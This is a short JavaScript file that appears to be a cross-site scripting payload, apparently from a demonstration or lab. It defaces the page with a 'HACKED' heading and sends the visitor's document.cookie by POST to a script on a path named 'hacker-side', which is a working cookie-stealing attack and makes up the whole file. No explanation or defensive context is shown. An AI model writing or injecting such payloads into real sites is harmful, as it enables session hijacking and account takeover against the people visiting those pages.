const div = document.createElement('div');
const h1 = document.createElement('h1');
h1.innerText = "HACKED";
div.append(h1);
document.body.append(h1);
fetch('../hacker-side/hacker-write.php', {
  method: 'post',
  headers: {
    'Accept': 'application/json, text/plain, */*',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({cookies: document.cookie})
}).then(res => res.json())
  .then(res => console.log(res));

